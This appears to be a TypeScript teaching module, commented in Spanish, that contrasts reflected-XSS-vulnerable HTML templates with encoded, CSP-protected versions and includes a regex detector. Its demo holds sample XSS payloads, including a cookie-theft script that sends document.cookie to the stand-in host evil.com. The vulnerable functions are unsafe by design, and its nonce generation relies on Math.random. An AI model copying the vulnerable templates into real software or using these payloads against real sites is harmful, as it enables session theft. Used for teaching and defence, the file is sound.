/**
 * XSS Reflected (Cross-Site Scripting Reflejado)
 *
 * Conceptos clave:
 * - El XSS reflejado ocurre cuando datos no confiables se incluyen en respuestas
 *   HTTP sin validación o codificación adecuada
 * - El payload malicioso se "refleja" desde la solicitud a la respuesta
 * - No se almacena en el servidor (a diferencia del XSS almacenado)
 *
 * Impacto:
 * - Robo de cookies/sesiones
 * - Defacement de páginas
 * - Redirección a sitios maliciosos
 * - Captura de pulsaciones de teclas
 */

import { createHash } from 'crypto';

// ============================================================================
// ❌ VULNERABLE: XSS Reflejado sin protección
// ============================================================================

/**
 * VULNERABLE: Servidor que refleja input del usuario sin sanitización
 *
 * Problema: El parámetro 'search' se incluye directamente en el HTML
 * sin codificación, permitiendo inyección de JavaScript
 */
export function vulnerableSearchPage(searchQuery: string): string {
    // ❌ NO HACER: Inyección directa de input del usuario en HTML
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Búsqueda</title>
        </head>
        <body>
            <h1>Resultados de búsqueda</h1>
            <p>Has buscado: ${searchQuery}</p>
            <div id="results">
                <!-- Resultados aquí -->
            </div>
        </body>
        </html>
    `;
}

/**
 * VULNERABLE: Mensaje de error que refleja input del usuario
 */
export function vulnerableErrorPage(username: string): string {
    // ❌ NO HACER: Input del usuario sin sanitizar
    return `
        <div class="error">
            <h2>Error de autenticación</h2>
            <p>Usuario no encontrado: ${username}</p>
            <p>Por favor, verifica tus credenciales.</p>
        </div>
    `;
}

/**
 * Demostración de ataque XSS reflejado
 */
export function demonstrateReflectedXSSAttack(): void {
    console.log('\n=== Demostración de Ataque XSS Reflejado ===\n');

    // Payload malicioso típico
    const maliciousPayload = '<script>alert("XSS")</script>';

    console.log('1. Payload malicioso:');
    console.log(`   ${maliciousPayload}`);

    const vulnerablePage = vulnerableSearchPage(maliciousPayload);
    console.log('\n2. Página vulnerable generada:');
    console.log(vulnerablePage);
    console.log('\n   ⚠️  El script se ejecutaría en el navegador de la víctima!');

    // Payload más sofisticado para robo de cookies
    const cookieTheftPayload =
        '<script>fetch("http://evil.com/steal?cookie=" + document.cookie)</script>';

    console.log('\n3. Payload de robo de cookies:');
    console.log(`   ${cookieTheftPayload}`);

    const cookieTheftPage = vulnerableSearchPage(cookieTheftPayload);
    console.log('\n   Las cookies se enviarían al atacante!');

    // URL crafted para el ataque
    const maliciousURL =
        'http://example.com/search?q=' +
        encodeURIComponent('<script>alert(document.cookie)</script>');

    console.log('\n4. URL maliciosa que un atacante enviaría:');
    console.log(`   ${maliciousURL}`);
}

// ============================================================================
// ✅ SECURE: Implementación protegida contra XSS
// ============================================================================

/**
 * Codifica caracteres HTML especiales para prevenir XSS
 *
 * Esta función convierte caracteres que tienen significado especial en HTML
 * a sus entidades HTML equivalentes, evitando que se interpreten como código
 */
export function htmlEncode(text: string): string {
    const htmlEntities: { [key: string]: string } = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
    };

    return text.replace(/[&<>"'\/]/g, (char) => htmlEntities[char] || char);
}

/**
 * ✅ SECURE: Página de búsqueda con codificación HTML
 *
 * Mejoras:
 * - Input del usuario se codifica antes de incluirlo en HTML
 * - Caracteres especiales se convierten en entidades HTML
 * - Content Security Policy (CSP) headers recomendados
 */
export function secureSearchPage(searchQuery: string): string {
    const safeQuery = htmlEncode(searchQuery);

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Búsqueda</title>
            <meta http-equiv="Content-Security-Policy"
                  content="default-src 'self'; script-src 'self'">
        </head>
        <body>
            <h1>Resultados de búsqueda</h1>
            <p>Has buscado: ${safeQuery}</p>
            <div id="results">
                <!-- Resultados aquí -->
            </div>
        </body>
        </html>
    `;
}

/**
 * ✅ SECURE: Mensaje de error con sanitización
 */
export function secureErrorPage(username: string): string {
    const safeUsername = htmlEncode(username);

    return `
        <div class="error">
            <h2>Error de autenticación</h2>
            <p>Usuario no encontrado: ${safeUsername}</p>
            <p>Por favor, verifica tus credenciales.</p>
        </div>
    `;
}

/**
 * Validador adicional para detectar intentos de XSS
 */
export function detectXSSAttempt(input: string): boolean {
    const xssPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+\s*=/i,  // eventos inline: onclick=, onerror=, etc.
        /<iframe/i,
        /<object/i,
        /<embed/i,
    ];

    return xssPatterns.some(pattern => pattern.test(input));
}

/**
 * ✅ SECURE: Procesamiento de input con validación y sanitización
 */
export function processUserInput(
    input: string,
    maxLength: number = 100
): { valid: boolean; sanitized: string; reason?: string } {
    // 1. Validar longitud
    if (input.length > maxLength) {
        return {
            valid: false,
            sanitized: '',
            reason: 'Input demasiado largo',
        };
    }

    // 2. Detectar patrones XSS
    if (detectXSSAttempt(input)) {
        console.warn(`⚠️  Intento de XSS detectado: ${input.substring(0, 50)}`);
        return {
            valid: false,
            sanitized: '',
            reason: 'Contenido sospechoso detectado',
        };
    }

    // 3. Sanitizar el input
    const sanitized = htmlEncode(input);

    return {
        valid: true,
        sanitized,
    };
}

/**
 * Generador de nonce para CSP inline scripts
 * (necesario si se requieren scripts inline legítimos)
 */
export function generateCSPNonce(): string {
    const randomBytes = createHash('sha256')
        .update(Math.random().toString())
        .digest('base64');

    return randomBytes.substring(0, 16);
}

/**
 * Demostración de protección contra XSS
 */
export function demonstrateXSSProtection(): void {
    console.log('\n=== Demostración de Protección contra XSS ===\n');

    const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="http://evil.com">',
        'normal text',
    ];

    maliciousInputs.forEach((input, index) => {
        console.log(`\n${index + 1}. Input: ${input}`);

        // Procesar con validación
        const result = processUserInput(input);

        if (result.valid) {
            console.log(`   ✅ Válido - Sanitizado: ${result.sanitized}`);
        } else {
            console.log(`   ❌ Rechazado - Razón: ${result.reason}`);
        }

        // Mostrar comparación
        const encoded = htmlEncode(input);
        if (encoded !== input) {
            console.log(`   Codificación HTML: ${encoded}`);
        }
    });

    // Demostrar CSP Nonce
    console.log('\n=== Content Security Policy ===');
    const nonce = generateCSPNonce();
    console.log(`Nonce generado: ${nonce}`);
    console.log(`Header CSP: script-src 'nonce-${nonce}' 'strict-dynamic'`);
}

// ============================================================================
// Comparación y Mejores Prácticas
// ============================================================================

/**
 * Resumen de diferencias entre código vulnerable y seguro
 */
export function printSecurityComparison(): void {
    console.log('\n=== XSS Reflejado: Vulnerable vs Seguro ===\n');

    console.log('❌ VULNERABLE:');
    console.log('   - Input del usuario insertado directamente en HTML');
    console.log('   - Sin validación de contenido');
    console.log('   - Sin codificación de caracteres especiales');
    console.log('   - Sin Content Security Policy');

    console.log('\n✅ SEGURO:');
    console.log('   - Codificación HTML de todo input del usuario');
    console.log('   - Validación de patrones sospechosos');
    console.log('   - Límites de longitud en inputs');
    console.log('   - Content Security Policy headers');
    console.log('   - Uso de templates seguros');

    console.log('\n📚 MEJORES PRÁCTICAS:');
    console.log('   1. NUNCA confiar en input del usuario');
    console.log('   2. Codificar TODOS los datos antes de mostrarlos');
    console.log('   3. Usar CSP para limitar ejecución de scripts');
    console.log('   4. Validar y sanitizar en cliente Y servidor');
    console.log('   5. Usar frameworks con auto-escape (React, Angular)');
    console.log('   6. Implementar HttpOnly y Secure flags en cookies');
    console.log('   7. Usar X-XSS-Protection header');
}

// ============================================================================
// Ejecución de Demostraciones
// ============================================================================

if (require.main === module) {
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║     XSS REFLEJADO - Vulnerable vs Seguro              ║');
    console.log('╚════════════════════════════════════════════════════════╝');

    demonstrateReflectedXSSAttack();
    demonstrateXSSProtection();
    printSecurityComparison();

    console.log('\n✅ Demostración completada\n');
}
